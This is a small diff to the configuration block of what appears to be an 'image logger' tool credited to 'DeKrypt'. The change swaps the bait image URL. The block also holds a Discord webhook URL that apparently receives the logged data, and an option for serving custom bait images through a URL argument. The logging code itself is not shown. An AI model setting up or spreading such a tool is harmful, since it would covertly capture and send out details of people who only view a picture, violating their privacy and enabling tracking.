@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1371789017917689906/PPWfuwjjYf7Sr4wezvw9XY_8YwG8ysSEZjLzh-ed4cPWSqDmxPtHQx9SUW0WUXZ3alVb",
-    "image": "https://media.tenor.com/-UEDHR1Wg7MAAAPo/genius-smart.mp4", # You can also have a custom image by using a URL argument
+    "image": "https://i.imgur.com/W4NIgBJ.jpeg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
